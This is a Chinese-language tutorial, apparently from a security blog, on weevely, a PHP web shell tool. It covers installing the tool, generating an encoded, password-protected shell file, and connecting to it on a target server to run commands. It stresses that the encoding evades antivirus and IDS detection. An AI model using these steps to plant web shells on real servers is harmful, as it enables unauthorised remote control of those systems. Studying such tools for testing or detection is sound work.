> `weevely`是一款针对php程序的远程连接工具。和我们常用的一句话`shell`类似。通过建立连接可以使宿主和目标直接建立连接，从而完成文件的上传和下载。`weevely`服务端的代码进行了`base64`编码和加密。从而逃避杀毒软件和IDS的检测。

本文将为你介绍`weevely`的常规使用，以及对其流量特征进行分析。

### 😘安装和使用

weevely在kali中已经默认安装。如果其他系统需要安装，可用`yum` 或`apt`命令进行安装。

```
apt-get install weevely

```

**帮助**

```
$ weevely

4.0.1

weevely

 <URL> <password> [cmd]weevely

 session <path> [cmd]new
 agentweevely
 generate <password> <path>
```

### 🐼创建Shell

格式如下：`weevely generate <连接密码> <生成目录>`

```
weevely generate 123456 /root/bbskali.php

```

![](../Images/adb2feeefa3ab2e416f55a53a3148f7b.png)

如上图，便生成了名为`bbskali.php`的一句话shell，并且内容是base64加密。

### 🍺建立连接

格式如下：`weevely <目标url> <密码>`

```
weevely http://192.168.5.38/bbskali.php 123456

```

![](../Images/8a8909ee46f405c86077ceeaecad1599.png)

如上便建立了连接

**列出网站目录**

```
ls #linux
dir # windows

```

![](../Images/8817963bc099c24d0f46d134916eb8fc.png)

如上，我们只需在终端中执行相应的`Windows`命令即可。
